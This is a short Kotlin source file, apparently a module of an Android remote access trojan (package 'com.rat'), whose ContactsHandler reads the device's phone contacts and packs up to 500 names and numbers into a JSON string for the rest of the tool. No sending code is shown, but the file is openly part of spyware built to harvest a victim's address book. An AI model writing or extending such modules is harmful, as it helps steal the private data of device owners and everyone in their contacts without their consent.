package com.rat

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object ContactsHandler {
    fun dump(ctx: Context): String {
        val arr = JSONArray()
        val cursor = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null, null
        )
        cursor?.use {
            val iName = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val iNum  = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext() && arr.length() < 500) {
                arr.put(JSONObject().apply {
                    put("name", it.getString(iName) ?: "")
                    put("number", it.getString(iNum) ?: "")
                })
            }
        }
        return arr.toString()
    }
}
